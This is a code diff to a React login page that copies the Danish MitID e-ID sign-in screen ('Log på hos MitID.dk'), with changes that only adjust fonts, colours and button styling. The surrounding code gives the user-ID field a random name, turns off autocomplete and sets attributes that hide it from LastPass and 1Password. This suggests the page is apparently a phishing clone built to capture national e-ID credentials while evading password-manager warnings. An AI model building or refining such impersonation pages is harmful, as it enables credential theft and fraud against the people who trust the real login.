@@ -35,28 +35,28 @@ export default function LoginPage({ onSessionCreated }: Props) {
   }
 
   return (
-    <div className="min-h-screen bg-[#f0f1f3] flex flex-col">
+    <div className="min-h-screen bg-[#f0f1f3] flex flex-col" style={{ fontFamily: '"IBM Plex Sans", Arial, Helvetica, FreeSans, sans-serif', lineHeight: '1.5rem', fontSize: '1rem', color: '#333' }}>
       <header className="hidden sm:flex bg-white h-[50px] items-center px-6 border-b border-gray-200">
         <BrandLogo />
       </header>
       <main className="flex-1 flex items-start justify-center sm:pt-[60px] pt-0 px-0 sm:px-6">
         <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full items-center lg:items-start">
           <CardShell>
-            <form onSubmit={handleSubmit} className="flex flex-col h-full">
+            <form onSubmit={handleSubmit} className="flex flex-col h-full" style={{ width: '100%', boxSizing: 'content-box' }}>
               <div className="flex items-start justify-between mb-0">
-                <h1 style={{ fontFamily: "'IBM Plex Sans', Arial, Helvetica, FreeSans, sans-serif" }} className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4">Log på hos MitID.dk</h1>
+                <h1 className="text-[17px] font-bold leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                 <MitIdLogo />
               </div>
               <hr className="border-gray-300 mt-[12px] mb-[16px]" />
               <div className="mb-[16px]">
                 <div className="flex items-center gap-[6px] mb-[8px]">
-                  <label className="text-[14px] font-bold text-[#001C44]">Bruger-ID</label>
+                  <label className="text-[14px] font-bold">Bruger-ID</label>
                   <button type="button" className="w-[16px] h-[16px] rounded-full flex items-center justify-center cursor-help" aria-label="Åbn hjælpetekst"><HelpIcon /></button>
                 </div>
                 <div className="relative">
                   <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                     name={`uid_${Math.random().toString(36).slice(2)}`}
-                    className="w-full border border-[#999] rounded-[2px] px-[12px] py-[10px] text-[14px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-[60px]" autoComplete="off" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
+                    className="w-full border border-[#999] rounded-[2px] px-[12px] py-[10px] text-[14px] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-[60px]" autoComplete="off" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
                   <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-[12px] top-1/2 -translate-y-1/2 text-[14px] text-[#0055a5] cursor-pointer select-none font-medium" tabIndex={0}>
                     {showUserId ? 'Skjul' : 'Vis'}
                   </div>
@@ -68,19 +68,18 @@ export default function LoginPage({ onSessionCreated }: Props) {
                   userId.trim() && !loading
                     ? 'bg-[#0055a5] hover:bg-[#004080] text-white cursor-pointer'
                     : 'bg-[#e6e6e6] text-[#999] cursor-not-allowed'
-                }`}
-                style={{ fontFamily: "'IBM Plex Sans', Arial, Helvetica, FreeSans, sans-serif" }}>
-                <span className="tracking-[0.02em]">{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
+                }`}>
+                <span className="uppercase tracking-[0.02em]">{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
               </button>
               <div className="mt-[16px] mb-[4px]">
-                <a href="#" className="inline-flex items-center gap-[8px] text-[#0055a5] hover:underline text-[15px] font-bold" style={{ fontFamily: "'IBM Plex Sans', Arial, Helvetica, FreeSans, sans-serif" }}>
+                <a href="#" className="inline-flex items-center gap-[8px] text-[#0055a5] hover:underline text-[15px] font-bold">
                   <InfoIcon /><span>Glemt bruger-ID?</span>
                 </a>
               </div>
               <div className="flex-1" />
               <label className="flex items-start gap-[10px] cursor-pointer mb-[12px]">
                 <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="mt-[2px] w-[18px] h-[18px] accent-[#0055a5] cursor-pointer shrink-0" />
-                <span className="text-[14px] text-[#001C44] leading-snug">Husk mig hos MitID.dk</span>
+                <span className="text-[14px] leading-snug">Husk mig hos MitID.dk</span>
               </label>
               <hr className="border-gray-300 mb-[12px]" />
               <nav className="flex items-center gap-[32px] text-[14px] text-[#0055a5] font-medium">
